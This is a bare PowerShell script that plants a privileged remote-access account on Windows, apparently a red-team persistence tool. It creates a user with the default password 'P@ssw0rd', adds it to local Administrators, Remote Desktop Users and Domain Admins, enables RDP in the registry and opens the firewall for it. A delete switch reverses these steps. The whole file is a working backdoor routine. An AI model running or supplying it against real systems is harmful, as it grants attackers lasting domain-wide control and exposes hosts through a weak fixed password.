param (
    [string]$username,
    [string]$password = "P@ssw0rd",
    [switch]$Delete
)

if ($Delete) {
    try {
        net user $username /delete | Out-Null
        net localgroup administrators $username /delete | Out-Null
        net localgroup "Remote Desktop Users" $username /delete | Out-Null
        net group "Domain Admins" $username /delete /domain 2>&1 | Out-Null
        Write-Host "Account $username deleted and all changes reverted."
    }
    catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    }
} else {
    try {
        net user $username $password /add | Out-Null
        net localgroup administrators $username /add | Out-Null
        net localgroup "Remote Desktop Users" $username /add | Out-Null
        net group "Domain Admins" $username /add /domain 2>&1 | Out-Null
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0 | Out-Null
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null
        netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes | Out-Null
        Write-Host "Account created for $username with password $password"
    }
    catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    }
}
